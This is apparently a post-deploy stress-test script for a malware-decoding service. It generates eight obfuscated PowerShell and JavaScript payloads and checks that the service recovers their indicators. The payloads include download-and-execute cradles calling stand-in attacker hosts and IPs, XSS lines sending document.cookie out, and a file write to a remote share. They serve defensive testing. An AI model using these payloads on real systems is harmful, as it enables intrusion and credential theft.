#!/usr/bin/env python3
"""NivXRay — Sophisticated payload stress-test suite (post-deploy).

Generates 8 VALID encoded PowerShell/JS command-lines with real IOCs, runs
each through /api/decode/smart on the production URL, and reports:

  • recipe chain length     (how many layers peeled)
  • confidence              (deterministic-decoder score, 0-100)
  • recovered plaintext     (proves no hallucination)
  • extracted IOCs          (URLs / IPs / domains / hashes)
  • MITRE fired             (from the analyze phase)

Every payload is GENERATED from real Python compression / encoding libraries
so the compressed streams are guaranteed valid. No hand-typed base64 blobs.

Usage:
    export NIVXRAY_URL='https://your-prod-url.com'
    export NIVXRAY_EMAIL='admin@nivxray.com'
    export NIVXRAY_PASSWORD=os.environ.get("ADMIN_PASSWORD", "")
    python3 /app/backend/tests/stress_test_encoded_commandlines.py
"""
from __future__ import annotations
import base64
import binascii
import gzip
import json
import os
import sys
import time
import urllib.request
import urllib.error
import zlib
from typing import Dict, List, Tuple

NIVXRAY_URL = os.environ.get("NIVXRAY_URL") or "https://greeting-app-5782.preview.emergentagent.com"
EMAIL = os.environ.get("NIVXRAY_EMAIL") or "admin@nivxray.com"
PASSWORD = os.environ.get("NIVXRAY_PASSWORD") or os.environ.get("ADMIN_PASSWORD", "")


def _post(path: str, body: dict, token: str | None = None, timeout: float = 45.0) -> dict:
    req = urllib.request.Request(
        NIVXRAY_URL.rstrip("/") + path,
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json",
                 # Some hosts (Cloudflare, etc.) 403 unbranded urllib UAs. Send a browser UA.
                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) NivXRay-StressTest/1.0",
                 **({"Authorization": f"Bearer {token}"} if token else {})},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode())


def login() -> str:
    return _post("/api/auth/login", {"email": EMAIL, "password": PASSWORD})["access_token"]


# ============================================================================
# Payload generators — each returns (title, description, payload, expected_iocs)
# ============================================================================

def gen_1_double_base64_url() -> Tuple[str, str, str, List[str]]:
    inner = "IEX (New-Object Net.WebClient).DownloadString('https://cdn.malicious-example.com/loader.ps1')"
    b64_once = base64.b64encode(inner.encode()).decode()
    payload = base64.b64encode(b64_once.encode()).decode()
    return ("Double Base64 URL wrapper",
            "b64(b64(IEX-downloader)) — 2 layer trivial",
            payload,
            ["cdn.malicious-example.com"])


def gen_2_ps_encoded_command() -> Tuple[str, str, str, List[str]]:
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://45.137.21.9/beacon.ps1')"
    b64_utf16 = base64.b64encode(inner.encode("utf-16-le")).decode()
    payload = f"powershell.exe -NoP -NonI -W Hidden -EncodedCommand {b64_utf16}"
    return ("PowerShell -EncodedCommand",
            "The canonical Empire/Cobalt-Strike wrapper",
            payload,
            ["45.137.21.9"])


def gen_3_base64_gzip_ps() -> Tuple[str, str, str, List[str]]:
    inner = ("$c=New-Object Net.WebClient;"
             "$c.Headers.Add('User-Agent','Mozilla/5.0 Trickbot/2.4');"
             "IEX($c.DownloadString('https://c2.evilcorp.ru/gate.php'))")
    gz = gzip.compress(inner.encode())
    b64 = base64.b64encode(gz).decode()
    ps = (f'$d=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{b64}"));'
          'IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($d,'
          '[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()')
    return ("Base64 → GZIP → PS Cradle",
            "Standard TrickBot/Empire dropper pattern",
            ps,
            ["c2.evilcorp.ru"])


def gen_4_base64_xor_gzip() -> Tuple[str, str, str, List[str]]:
    """base64 → XOR (single byte 0x2f) → gzip → cleartext with C2."""
    inner = "IEX (iwr -UseBasicParsing 'http://185.220.101.45/stage2.txt')"
    gz = gzip.compress(inner.encode())
    xored = bytes(b ^ 0x2F for b in gz)
    payload = base64.b64encode(xored).decode()
    return ("Base64 → single-byte XOR (0x2f) → GZIP",
            "3-layer stager — magic must recover the XOR key from brute force",
            payload,
            ["185.220.101.45"])


def gen_5_hex_encoded_ps() -> Tuple[str, str, str, List[str]]:
    inner = "iex((iwr 'http://malicious-cdn.example.com/x' -UseBasicParsing).Content)"
    payload = binascii.hexlify(inner.encode()).decode()
    return ("Raw hex-encoded PowerShell",
            "Hex encoding without any wrapper",
            payload,
            ["malicious-cdn.example.com"])


def gen_6_js_charcode_dropper() -> Tuple[str, str, str, List[str]]:
    payload_str = "location='http://phish.login-microsoft-secure.net/o365?u='+document.cookie"
    charcodes = ",".join(str(ord(c)) for c in payload_str)
    js = f"eval(String.fromCharCode({charcodes}))"
    return ("JavaScript String.fromCharCode()",
            "Classic browser XSS/phishing obfuscation",
            js,
            ["phish.login-microsoft-secure.net"])


def gen_7_url_encoded_xss() -> Tuple[str, str, str, List[str]]:
    inner = "<script>fetch('http://evil.example/steal?c='+document.cookie)</script>"
    payload = "".join(f"%{ord(c):02X}" for c in inner)
    return ("URL-encoded XSS payload",
            "Every char percent-encoded — analyze/command should handle",
            payload,
            ["evil.example"])


def gen_8_nested_b64_gzip_b64_xor() -> Tuple[str, str, str, List[str]]:
    """4-layer: base64 → gzip → base64 → single-byte XOR (0x5b) → cleartext."""
    inner = ("[System.Reflection.Assembly]::Load([Convert]::FromBase64String('...'));"
             "$env:COMPUTERNAME | Out-File \\\\45.137.21.9\\share\\loot.txt")
    xored = bytes(b ^ 0x5B for b in inner.encode())
    b64_1 = base64.b64encode(xored).decode()
    gz = gzip.compress(b64_1.encode())
    payload = base64.b64encode(gz).decode()
    return ("4-layer: b64 → gzip → b64 → XOR",
            "Deep nested — tests recursive magic-decode",
            payload,
            ["45.137.21.9"])


CASES = [
    gen_1_double_base64_url, gen_2_ps_encoded_command, gen_3_base64_gzip_ps,
    gen_4_base64_xor_gzip, gen_5_hex_encoded_ps, gen_6_js_charcode_dropper,
    gen_7_url_encoded_xss, gen_8_nested_b64_gzip_b64_xor,
]


# ============================================================================
# Runner
# ============================================================================

def run() -> None:
    print(f"╔══════════════════════════════════════════════════════════════════╗")
    print(f"║  NivXRay Stress-Test Suite (8 sophisticated encoded payloads)   ║")
    print(f"║  URL: {NIVXRAY_URL:56s}║")
    print(f"╚══════════════════════════════════════════════════════════════════╝\n")

    try:
        token = login()
        print("✓ Auth OK\n")
    except Exception as e:
        print(f"✗ Auth failed: {e}")
        sys.exit(1)

    passes = 0
    fails = 0
    for i, gen in enumerate(CASES, 1):
        title, desc, payload, expected_iocs = gen()
        print(f"─" * 72)
        print(f"[{i}/{len(CASES)}] {title}")
        print(f"        {desc}")
        print(f"        input length: {len(payload)} chars")
        print(f"        expected IOCs: {expected_iocs}")
        try:
            t0 = time.time()
            r = _post("/api/decode/smart", {"input": payload}, token=token, timeout=45)
            elapsed = time.time() - t0
        except Exception as e:
            print(f"        ✗ ERROR: {e}")
            fails += 1
            continue

        recipe = [s["op"] for s in r.get("recipe") or []]
        conf = r.get("confidence", 0)
        engine = r.get("engine", "?")
        output = (r.get("output") or "")[:200]
        # Check IOC recovery via /analyze
        try:
            ana = _post("/api/analyze", {"input": payload, "output": r.get("output"),
                                          "enrich_osint": False, "describe": False,
                                          "use_ai_verdict": False}, token=token, timeout=30)
            iocs_found = ana.get("iocs") or {}
            all_recovered = (iocs_found.get("urls") or []) + (iocs_found.get("ips") or []) \
                          + (iocs_found.get("domains") or [])
        except Exception as e:
            all_recovered = []
            print(f"        ⚠  analyze failed: {e}")

        ok = all(any(exp in v for v in all_recovered) for exp in expected_iocs)
        badge = "✓ PASS" if ok else "✗ FAIL"
        print(f"        engine={engine} · conf={conf}% · {len(recipe)} ops · {elapsed:.2f}s")
        print(f"        recipe: {' → '.join(recipe) if recipe else '(none)'}")
        print(f"        output: {output!r}")
        print(f"        IOCs recovered: {all_recovered[:8]}")
        print(f"        {badge}")
        if ok: passes += 1
        else:  fails += 1

    print("─" * 72)
    print(f"\nSUMMARY: {passes}/{len(CASES)} passed, {fails} failed")
    sys.exit(0 if fails == 0 else 1)


if __name__ == "__main__":
    run()
